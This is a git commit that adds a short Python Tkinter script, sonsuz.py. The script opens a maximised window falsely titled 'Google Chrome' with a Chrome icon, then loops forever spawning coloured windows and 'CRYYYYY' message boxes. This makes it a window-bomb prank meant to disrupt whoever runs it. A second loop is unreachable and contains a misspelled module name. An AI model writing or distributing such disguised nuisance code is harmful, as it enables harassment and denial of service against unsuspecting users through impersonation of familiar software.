1dac7accbb7a7c19ad770e326a4799b84f94c131
MBC162004 <65822496+MBC162004@users.noreply.github.com>
2020-05-23 19:39:28 +0300

    Add files via upload

---
+++ sonsuz.py
@@ -0,0 +1,40 @@
+from tkinter import *
+from tkinter import messagebox as tkMessageBox
+
+Trap=Tk()
+Trap.iconbitmap('chrome.ico')
+Trap.state('zoomed')
+Trap.title("Google Chrome")
+
+
+while True:
+    tkMessageBox.showinfo("LOL","CRYYYYY!!!!!!!!!!!!!!!!!")
+    tkMessageBox.showinfo("LOL","CRYYYYY!!!!!!!!!!!!!!!!!")
+    tkMessageBox.showinfo("LOL","CRYYYYY!!!!!!!!!!!!!!!!!")
+    tkMessageBox.showinfo("LOL","CRYYYYY!!!!!!!!!!!!!!!!!")
+    t=Tk()
+    t.title("Cry!!!")
+    t.configure(background="black")
+    t.iconbitmap('chrome.ico')
+    z=Tk()
+    z.title("Cry!!!")
+    z.configure(background="red")
+    z.iconbitmap('chrome.ico')
+    f=Tk()
+    f.title("Cry!!!")
+    f.configure(background="purple")
+    f.iconbitmap('chrome.ico')
+    tks=Tk()
+    tks.title("Cry!!!")
+    tks.configure(background="yellow")
+    tks.iconbitmap('chrome.ico')
+
+while True:
+    tyu = Tk()
+    tyu.geometry("600x600")
+    tyu.title("Cry")
+    a = Label(tyu,text="CRY!!!")
+    a.place(relx=0.45,rely=0.45)
+    tkMesageBox.showinfo("LOL","CRYYYYYYYYY!!!!!!!!!!!!!!!!!!!!!!!")
+
+mainloop()
